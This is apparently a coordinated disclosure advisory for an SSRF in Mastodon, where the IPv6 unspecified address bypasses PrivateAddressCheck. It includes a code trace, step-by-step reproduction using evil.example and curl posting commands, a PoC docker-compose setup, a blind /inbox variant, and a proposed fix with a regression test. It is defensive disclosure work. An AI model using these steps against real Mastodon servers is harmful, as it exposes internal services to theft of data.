<!-- source: https://red.anthropic.com/2026/cvd/findings/ANT-2026-6DSMTXZ8 -->

# ANT-2026-6DSMTXZ8 · mastodon/mastodon

## ssrf high

[CVE-2026-46348](https://nvd.nist.gov/vuln/detail/CVE-2026-46348)
[GHSA-crr4-7rm4-8gpw](https://github.com/advisories/GHSA-crr4-7rm4-8gpw)

Maintainer -

Anthropic's analysis, sealed at approval. Disclosure to the maintainer was performed by Doyensec.

# ANT-2026-6DSMTXZ8: SSRF Bypass via IPv6 Unspecified Address (`::`) in Mastodon

Mastodon routes all outbound HTTP through Request::Socket, which validates resolved IPs with PrivateAddressCheck.private\_address?. That check blocks 0.0.0.0/8 and ::1 but omits ::/128, so an attacker-controlled hostname with an AAAA record of `::` passes the filter. On Linux, connect() to `::` is routed to the loopback interface, so the server issues the request to [::1]:PORT. Any registered user (via link preview, profile link verification, or search) — or an unauthenticated remote actor via ActivityPub federation — can trigger this to read internal HTTP services, with responses partially exfiltrated through PreviewCard OpenGraph fields rendered in the timeline.

**Project:** mastodon
**Commit:** `c832fb3291f25d8b`
**Location:** `app/lib/private_address_check.rb:33`

For IPAddr.new("::"), all four predicates in private\_address? return false: it is not private?, not loopback?, not link\_local?, and ::/128 is absent from CIDR\_LIST (the IPv4-mapped entry ::ffff:0.0.0.0/104 does not cover ::). The DNS resolution branch in Request::Socket.open returns a Resolv::IPv6 object, so an AF\_INET6 socket is correctly created and connect\_nonblock(::) succeeds, reaching ::1. The literal-URL path http://[::]/ is only accidentally blocked by an unrelated is\_a?(Resolv::IPv6) type bug, which is not a security control.

1. Register evil.example and publish AAAA evil.example -> ::
2. POST /api/v1/statuses with body containing http://evil.example:PORT/path (or set it as a profile link, search @user@evil.example, or deliver an ActivityPub object referencing the URL)
3. LinkCrawlWorker / FetchLinkCardService calls Request.new(:get, url).perform
4. Request::Socket.open resolves evil.example via Resolv::DNS -> [Resolv::IPv6 ::]
5. check\_private\_address(::) returns false — filter bypassed
6. AF\_INET6 socket connects to ::, kernel routes to ::1; GET /path is sent to the internal service
7. Response is parsed for og:title/og:description/og:image, stored in preview\_cards, and rendered in the attacker's timeline

This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by the Anthropic security team in collaboration with Anthropic Research. Please direct questions to security-cvd@anthropic.com and reference ANT-2026-6DSMTXZ8.

---

**Reference:** ANT-2026-6DSMTXZ8

Triage and disclosure were performed by Doyensec. The writeup below is the document the firm sent to the maintainer.

# **Vulnerability Report**

## Vulnerability Header

| Field | Value |
| --- | --- |
| **Vulnerability Title** | SSRF Bypass via IPv6 Unspecified Address (`::`) in `PrivateAddressCheck` |
| **Severity Rating** | High |
| **Bug Category** | Server-Side Request Forgery (SSRF) — Incomplete Blocklist |
| **Location** | `app/lib/private_address_check.rb:19`, `app/lib/request.rb:332–338` |
| **Affected Versions** | All current versions (confirmed on v4.5.9) |

## Executive Summary

Mastodon's SSRF protection (`PrivateAddressCheck`) blocks the IPv4 unspecified address (`0.0.0.0/8`) but omits its IPv6 equivalent (`::/128`). On Linux, a TCP `connect()` to `::` is routed by the kernel to `::1`, reaching any service bound to localhost. An attacker registers a domain with an AAAA record of `::` and posts a link to it; Mastodon's Sidekiq worker resolves the hostname via DNS, receives the `::` address, passes it through the SSRF guard (which returns `false` for `::`), and connects to `[::1]` — reaching internal services on the Mastodon server. The HTTP response is parsed for OpenGraph tags and stored in the `preview_cards` database table, giving the attacker a direct read channel for internal service content. The only server-side precondition is that the host has a non-loopback IPv6 address, which is the default on all major cloud providers (AWS, GCP, Azure, Hetzner, DigitalOcean, and others).

## Root Cause Analysis

### Technical Description

`PrivateAddressCheck` is Mastodon's SSRF blocklist, invoked for every outbound HTTP request. The `private_address?` method at `app/lib/private_address_check.rb:33` applies four checks to the resolved IP address:

```
# app/lib/private_address_check.rb:33
def private_address?(address)
  address.private? || address.loopback? || address.link_local? || CIDR_LIST.any? { |cidr| cidr.include?(address) }
end
```

`CIDR_LIST` is built at line 19 and explicitly includes `0.0.0.0/8` (and its IPv4-mapped form `::ffff:0.0.0.0/104`) to block the IPv4 unspecified address. **The IPv6 equivalent, `::/128`, is not present.** All four sub-checks return `false` for `IPAddr.new("::")`:

| Check | Result | Reason |
| --- | --- | --- |
| `address.private?` | `false` | `::` is not in `fc00::/7` |
| `address.loopback?` | `false` | `::` ≠ `::1` |
| `address.link_local?` | `false` | `::` is not in `fe80::/10` |
| `CIDR_LIST.any?` | `false` | `::/128` is absent; `::ffff:0.0.0.0/104` does not cover `::` |

Note that `::ffff:0.0.0.0` is `0000:0000:0000:0000:0000:ffff:0000:0000`, a completely different bit pattern from `::` (`0000:0000:0000:0000:0000:0000:0000:0000`). The mapping covers IPv4-mapped addresses, not the unspecified address.

When an attacker-controlled hostname resolves via DNS to `Resolv::IPv6(::)`, `check_private_address` at `request.rb:332` converts it to `IPAddr.new("::")`, calls `private_address?` (which returns `false`), and allows the connection to proceed. Linux then routes `connect(AF_INET6, ::, port)` to `::1`, reaching any HTTP service bound to localhost on the Mastodon host.

### Trace Analysis

Key code locations for the primary (link preview) attack path:

```
app/services/post_status_service.rb:155         ← LinkCrawlWorker.perform_async — link fetch queued after status creation
app/services/fetch_link_card_service.rb:54      ← Request.new(:get, @url).perform — outbound HTTP initiated
app/lib/request.rb:268                          ← Resolv::DNS.getaddresses(host) — DNS returns [Resolv::IPv6(::)]
app/lib/request.rb:277                          ← check_private_address(Resolv::IPv6(::), host) — SSRF guard invoked
app/lib/request.rb:337                          ← PrivateAddressCheck.private_address?(IPAddr("::")) → false — BYPASS
app/lib/request.rb:284                          ← sock.connect_nonblock(..., "::") — kernel routes to ::1
```

## Exploitability Assessment

### Attack Vector & Reachability

| Attack vector | Network |
| --- | --- |
| **Authentication required** | Low — a registered user account, trivially obtained on any open-registration instance |
| **User interaction required** | None — Sidekiq fetches the link automatically upon status creation |
| **Reachable in default config** | Yes — requires a non-loopback IPv6 address on the server, which is the default on all major cloud providers |
| **Entry point(s)** | Status post containing a link to an attacker-controlled domain with AAAA record `::`. Additional vectors: remote account resolution (`/api/v2/search?resolve=true`), profile link verification, inbound ActivityPub federation (unauthenticated — see below) |

### Sinks

The attacker achieves a **GET-only read SSRF** against any HTTP service bound to `[::1]` or `::` on the Mastodon server. There is no request body control, no HTTP method control, and header injection is limited to `Host` (indirectly, via hostname choice). For services serving HTML responses, the exfiltration channel is the link preview card: OpenGraph meta tags (`og:title`, `og:description`, `og:author`, `og:site_name`) and JSON-LD `<script>` blocks are parsed from the response and stored in the `preview_cards` table with no application-level size limits on most string fields. The attacker reads the exfiltrated data from `GET /api/v1/statuses/{id}`.

A secondary exfiltration path exists via oEmbed: if the fetched page contains a `<link rel="alternate" type="application/json+oembed">` tag, `FetchOEmbedService` issues a second GET request to that URL — which can also point to a `[::1]`-bound service — enabling two-hop SSRF with additional fields extracted from the JSON body.

Additionally, an unauthenticated blind SSRF variant exists via `POST /inbox`: the `Signature` header's `keyId` field is attacker-controlled and is used to make an outbound key-fetch request via `ActivityPub::FetchRemoteKeyService` → `Request.new`, which passes through the same vulnerable `PrivateAddressCheck`. This vector requires no Mastodon account; it enables port scanning and GET-triggered side effects on `[::1]` but does not support data exfiltration (the response must be valid ActivityPub JSON to propagate further).

### Reproduction Steps

**Environment**

| OS / version | Linux with a non-loopback IPv6 address configured |
| --- | --- |
| Target version | Mastodon v4.5.9 |
| DNS prerequisite | `local.doyentesting.com` AAAA record resolves to `::` (configured by the reporter) |

**Setup**

The `poc/` directory contains a `docker-compose.yml` based on the [official Mastodon v4.5.9 compose file](https://github.com/mastodon/mastodon/blob/v4.5.9/docker-compose.yml) with three modifications:

1. IPv6 enabled on both Docker networks (`enable_ipv6: true`).
2. `poc/page.html` — a sample HTML page with OpenGraph tags, representing a localhost-only internal resource — is mounted read-only into the Sidekiq container at `/tmp/srv/page.html`.
3. The Sidekiq container's startup command launches a WEBrick HTTP server (`ruby -run -e httpd /tmp/srv/ -p 8000`) in the background before starting Sidekiq. This simulates an internal service accessible on port 8000 within the container.

Set up the instance on an IPv6-connected machine as you would a standard Mastodon deployment:

```
cd poc/
touch .env.production

docker compose up -d db redis
# Complete the setup wizard
docker compose run --rm web bundle exec rake db:setup
docker compose up -d
```

**Trigger**

Once the instance is running, post a status containing the target URL. This can be done via the Mastodon web UI or the API:

```
# Post a status linking to local.doyentesting.com (AAAA → ::)
curl -s -X POST https://YOUR_MASTODON_HOST/api/v1/statuses \
  -H "Authorization: Bearer $USER_TOKEN" \
  -F "status=http://local.doyentesting.com:8000/page.html"
```

Wait a few seconds for Sidekiq to process the link preview, then retrieve the status:

```
curl -s "https://YOUR_MASTODON_HOST/api/v1/statuses/$STATUS_ID" | jq '.card'
```

**Expected output**

The `card` field of the status will contain data fetched from the Sidekiq container's internal HTTP server — content that is not accessible from outside the container:

```
  "url": "http://local.doyentesting.com:8000/page.html",
  "title": "Secret Page",
  "description": "This is a super secret page exposed only on localhost."
```

The values `"Secret Page"` and `"This is a super secret page exposed only on localhost."` originate from `og:title` and `og:description` in `poc/page.html` — a file mounted inside the Sidekiq container that is not reachable by any direct external request.

**PoC files**

* `poc/docker-compose.yml` — Mastodon v4.5.9 setup with IPv6 enabled and the internal HTTP server configured in the Sidekiq container
* `poc/page.html` — simulated internal page (benign — contains OpenGraph tags with the placeholder text shown above)

## Recommended Fix

**Option 1 (preferred): Add `::/128` to `CIDR_LIST`**

Add the IPv6 unspecified address to the hard-coded blocklist in `app/lib/private_address_check.rb:19`, mirroring the existing `0.0.0.0/8` entry for IPv4:

```
CIDR_LIST = (IP4_CIDR_LIST + IP4_CIDR_LIST.map(&:ipv4_mapped) + [
  IPAddr.new('::/128'),          # IPv6 unspecified — routes to ::1 on Linux
  IPAddr.new('64:ff9b::/96'),
  IPAddr.new('100::/64'),
  # ... rest unchanged
]).freeze
```

A regression test to prevent this gap from re-opening:

```
# spec/lib/private_address_check_spec.rb
describe PrivateAddressCheck do
  describe '.private_address?' do
    it 'blocks the IPv6 unspecified address' do
      expect(described_class.private_address?(IPAddr.new('::'))).to be true
    end
  end
end
```

**Option 2 (defense in depth):** Fix the type-confusion bug at `app/lib/request.rb:279` where `address.is_a?(Resolv::IPv6)` is always `false` for literal-IP URLs (which return an `IPAddr`, not a `Resolv::IPv6`). This bug currently happens to block literal `http://[::]:PORT/` URLs as an unintended side effect, but it is not a security control and should be fixed alongside Option 1:

```
# BEFORE (request.rb:279)
sock = ::Socket.new(address.is_a?(Resolv::IPv6) ? ::Socket::AF_INET6 : ::Socket::AF_INET, ...)

# AFTER
af = case address
     when Resolv::IPv6 then ::Socket::AF_INET6
     when Resolv::IPv4 then ::Socket::AF_INET
     when IPAddr       then address.ipv6? ? ::Socket::AF_INET6 : ::Socket::AF_INET
     end
sock = ::Socket.new(af, ::Socket::SOCK_STREAM, 0)
```

We also recommend auditing `PrivateAddressCheck::CIDR_LIST` against the full [IANA IPv6 Special-Purpose Address Registry](https://www.iana.org/assignments/iana-ipv6-special-registry/iana-ipv6-special-registry.xhtml) for any other gaps (e.g., `64:ff9b:1::/48`, RFC 8215 local-use IPv4/IPv6 translation).

*Patch provenance:* AI-generated + Human-reviewed

## References

* CWE-918: Server-Side Request Forgery (SSRF)
* [IANA IPv6 Special-Purpose Address Registry](https://www.iana.org/assignments/iana-ipv6-special-registry/iana-ipv6-special-registry.xhtml)
* [Anthropic CVD Policy](https://anthropic.com/security/cvd-policy)

## Attribution

This vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by **Savio** at **Doyensec** in collaboration with Anthropic Research.

For CVE credits and public acknowledgments: **Doyensec in collaboration with Claude and Anthropic Research**

## Attachment: `poc/.env.production`

```

```

## Attachment: `poc/docker-compose.yml`

```
name: mastodon-ssrf-poc
services:
  db:
    restart: always
    image: postgres:14-alpine
    shm_size: 256mb
    env_file: .env.production
    networks:
      - internal_network
    healthcheck:
      test: ['CMD', 'pg_isready', '-U', 'postgres']
    volumes:
      - postgres14:/var/lib/postgresql/data
    environment:
      - 'POSTGRES_HOST_AUTH_METHOD=trust'
  redis:
    restart: always
    image: redis:7-alpine
    networks:
      - internal_network
    healthcheck:
      test: ['CMD', 'redis-cli', 'ping']
    volumes:
      - redis:/data
  web:
    image: ghcr.io/mastodon/mastodon:v4.5.9
    restart: always
    env_file: .env.production
    command: bundle exec puma -C config/puma.rb
    networks:
      - external_network
      - internal_network
    healthcheck:
      # prettier-ignore
      test: ['CMD-SHELL',"curl -s --noproxy localhost localhost:3000/health | grep -q 'OK' || exit 1"]
    ports:
      - '127.0.0.1:3000:3000'
    depends_on:
      - db
      - redis
    volumes:
      - public:/mastodon/public/system
  streaming:
    image: ghcr.io/mastodon/mastodon-streaming:v4.5.9
    restart: always
    env_file: .env.production
    command: node ./streaming/index.js
    networks:
      - external_network
      - internal_network
    healthcheck:
      # prettier-ignore
      test: ['CMD-SHELL', "curl -s --noproxy localhost localhost:4000/api/v1/streaming/health | grep -q 'OK' || exit 1"]
    ports:
      - '127.0.0.1:4000:4000'
    depends_on:
      - db
      - redis
  sidekiq:
    image: ghcr.io/mastodon/mastodon:v4.5.9
    restart: always
    env_file: .env.production
    command: bash -c 'nohup ruby -run -e httpd /tmp/srv/ -p 8000 & bundle exec sidekiq'
    depends_on:
      - db
      - redis
    networks:
      - external_network
      - internal_network
    volumes:
      - public:/mastodon/public/system
      - ./page.html:/tmp/srv/page.html:ro
    healthcheck:
      test: ['CMD-SHELL', "ps aux | grep '[s]idekiq\ 8' || false"]
networks:
  external_network:
    driver: bridge
    enable_ipv6: true
  internal_network:
    internal: true
    enable_ipv6: true
volumes:
  postgres14:
  redis:
  public:
```

## Attachment: `poc/page.html`

```
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>My Simple Page</title>
  <meta name="description" content="This is a super secret page exposed only on localhost.">

  <meta property="og:title" content="Secret Page">
  <meta property="og:description" content="This is a super secret page exposed only on localhost..">
  <meta property="og:type" content="website">

  <style>
    body {
      font-family: Arial, sans-serif;
      max-width: 720px;
      margin: 60px auto;
      padding: 0 20px;
      line-height: 1.5;
  </style>
</head>
<body>
  <h1>Hello</h1>
  <p>This is a secret HTML page exposed on localhost.</p>
</body>
</html>
```

1. 2026-03-30
2. 2026-04-23
3. 2026-05-07
4. 2026-05-15
5. 2026-05-20

868595c9247644d3902e1edcb8d502294a9a9cdfa37d38bc25ed6063dc37fcdc447494225eccdff02df7e7abd198eeb8cdad62dd274b7141939bcf342ce1f594

Committed 2026-04-23 00:04 PT

Revealed 2026-05-20 11:00 PT

[Verify (download preimage.json)](data:application/json;charset=utf-8,%7B%22ant_id%22%3A%22ANT-2026-6DSMTXZ8%22%2C%22bug_class%22%3A%22SSRF%22%2C%22claude_severity%22%3A%22high%22%2C%22commit_sha%22%3A%22c832fb3291f25d8b%22%2C%22created_at%22%3A%222026-03-30T23%3A19%3A45%2B00%3A00%22%2C%22description%22%3A%22Mastodon%20routes%20all%20outbound%20HTTP%20through%20Request%3A%3ASocket%2C%20which%20validates%20resolved%20IPs%20with%20PrivateAddressCheck.private_address%3F.%20That%20check%20blocks%200.0.0.0/8%20and%20%3A%3A1%20but%20omits%20%3A%3A/128%2C%20so%20an%20attacker-controlled%20hostname%20with%20an%20AAAA%20record%20of%20%60%3A%3A%60%20passes%20the%20filter.%20On%20Linux%2C%20connect%28%29%20to%20%60%3A%3A%60%20is%20routed%20to%20the%20loopback%20interface%2C%20so%20the%20server%20issues%20the%20request%20to%20%5B%3A%3A1%5D%3APORT.%20Any%20registered%20user%20%28via%20link%20preview%2C%20profile%20link%20verification%2C%20or%20search%29%20%E2%80%94%20or%20an%20unauthenticated%20remote%20actor%20via%20ActivityPub%20federation%20%E2%80%94%20can%20trigger%20this%20to%20read%20internal%20HTTP%20services%2C%20with%20responses%20partially%20exfiltrated%20through%20PreviewCard%20OpenGraph%20fields%20rendered%20in%20the%20timeline.%22%2C%22discovered_at%22%3Anull%2C%22location%22%3A%22app/lib/private_address_check.rb%3A33%22%2C%22poc_sha256%22%3A%22eb600e7800bc9aa3dc23a5a346ac7a315ab684d25c8cd4a0c9bfd2293308630b%22%2C%22preimage_version%22%3A1%2C%22project%22%3A%22mastodon%22%2C%22reproduction%22%3A%5B%221.%20Register%20evil.example%20and%20publish%20AAAA%20evil.example%20-%3E%20%3A%3A%22%2C%222.%20POST%20/api/v1/statuses%20with%20body%20containing%20http%3A//evil.example%3APORT/path%20%28or%20set%20it%20as%20a%20profile%20link%2C%20search%20%40user%40evil.example%2C%20or%20deliver%20an%20ActivityPub%20object%20referencing%20the%20URL%29%22%2C%223.%20LinkCrawlWorker%20/%20FetchLinkCardService%20calls%20Request.new%28%3Aget%2C%20url%29.perform%22%2C%224.%20Request%3A%3ASocket.open%20resolves%20evil.example%20via%20Resolv%3A%3ADNS%20-%3E%20%5BResolv%3A%3AIPv6%20%3A%3A%5D%22%2C%225.%20check_private_address%28%3A%3A%29%20returns%20false%20%E2%80%94%20filter%20bypassed%22%2C%226.%20AF_INET6%20socket%20connects%20to%20%3A%3A%2C%20kernel%20routes%20to%20%3A%3A1%3B%20GET%20/path%20is%20sent%20to%20the%20internal%20service%22%2C%227.%20Response%20is%20parsed%20for%20og%3Atitle/og%3Adescription/og%3Aimage%2C%20stored%20in%20preview_cards%2C%20and%20rendered%20in%20the%20attacker%27s%20timeline%22%5D%2C%22technical_details%22%3A%22For%20IPAddr.new%28%5C%22%3A%3A%5C%22%29%2C%20all%20four%20predicates%20in%20private_address%3F%20return%20false%3A%20it%20is%20not%20private%3F%2C%20not%20loopback%3F%2C%20not%20link_local%3F%2C%20and%20%3A%3A/128%20is%20absent%20from%20CIDR_LIST%20%28the%20IPv4-mapped%20entry%20%3A%3Affff%3A0.0.0.0/104%20does%20not%20cover%20%3A%3A%29.%20The%20DNS%20resolution%20branch%20in%20Request%3A%3ASocket.open%20returns%20a%20Resolv%3A%3AIPv6%20object%2C%20so%20an%20AF_INET6%20socket%20is%20correctly%20created%20and%20connect_nonblock%28%3A%3A%29%20succeeds%2C%20reaching%20%3A%3A1.%20The%20literal-URL%20path%20http%3A//%5B%3A%3A%5D/%20is%20only%20accidentally%20blocked%20by%20an%20unrelated%20is_a%3F%28Resolv%3A%3AIPv6%29%20type%20bug%2C%20which%20is%20not%20a%20security%20control.%22%2C%22title%22%3A%22SSRF%20Bypass%20via%20IPv6%20Unspecified%20Address%20%28%60%3A%3A%60%29%20in%20Mastodon%22%2C%22vendor_severity%22%3A%22high%22%7D)

```
  "ant_id": "ANT-2026-6DSMTXZ8",
  "bug_class": "SSRF",
  "commit_sha": "c832fb3291f25d8b",
  "created_at": "2026-03-30T23:19:45+00:00",
  "description": "Mastodon routes all outbound HTTP through Request::Socket, which validates resolved IPs with PrivateAddressCheck.private_address?. That check blocks 0.0.0.0/8 and ::1 but omits ::/128, so an attacker-controlled hostname with an AAAA record of `::` passes the filter. On Linux, connect() to `::` is routed to the loopback interface, so the server issues the request to [::1]:PORT. Any registered user (via link preview, profile link verification, or search) — or an unauthenticated remote actor via ActivityPub federation — can trigger this to read internal HTTP services, with responses partially exfiltrated through PreviewCard OpenGraph fields rendered in the timeline.",
  "location": "app/lib/private_address_check.rb:33",
  "poc_sha256": "eb600e7800bc9aa3dc23a5a346ac7a315ab684d25c8cd4a0c9bfd2293308630b",
  "project": "mastodon",
    "1. Register evil.example and publish AAAA evil.example -> ::",
    "2. POST /api/v1/statuses with body containing http://evil.example:PORT/path (or set it as a profile link, search @user@evil.example, or deliver an ActivityPub object referencing the URL)",
    "3. LinkCrawlWorker / FetchLinkCardService calls Request.new(:get, url).perform",
    "4. Request::Socket.open resolves evil.example via Resolv::DNS -> [Resolv::IPv6 ::]",
    "5. check_private_address(::) returns false — filter bypassed",
    "6. AF_INET6 socket connects to ::, kernel routes to ::1; GET /path is sent to the internal service",
    "7. Response is parsed for og:title/og:description/og:image, stored in preview_cards, and rendered in the attacker's timeline"
  "technical_details": "For IPAddr.new(\"::\"), all four predicates in private_address? return false: it is not private?, not loopback?, not link_local?, and ::/128 is absent from CIDR_LIST (the IPv4-mapped entry ::ffff:0.0.0.0/104 does not cover ::). The DNS resolution branch in Request::Socket.open returns a Resolv::IPv6 object, so an AF_INET6 socket is correctly created and connect_nonblock(::) succeeds, reaching ::1. The literal-URL path http://[::]/ is only accidentally blocked by an unrelated is_a?(Resolv::IPv6) type bug, which is not a security control.",
  "title": "SSRF Bypass via IPv6 Unspecified Address (`::`) in Mastodon",
```
